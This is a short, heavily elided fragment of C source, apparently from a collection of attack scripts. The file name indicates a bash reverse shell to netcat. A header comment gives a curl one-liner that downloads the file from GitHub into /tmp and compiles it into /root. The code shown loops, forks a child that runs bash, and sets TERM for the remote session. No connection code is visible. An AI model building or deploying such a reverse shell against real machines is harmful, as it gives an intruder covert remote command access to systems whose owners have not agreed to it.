//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat4.c > /tmp/BashReversoANetCat4.c; gcc /tmp/BashReversoANetCat4.c -o /root/BashReversoANetCat4
//
...
int main() {
    ...
    while (1) {
        ...
        if (fork() == 0) {  // Proceso hijo: ejecuta bash
            ...
            // Exportar la variable TERM para evitar errores en programas como mc
            putenv("TERM=xterm");
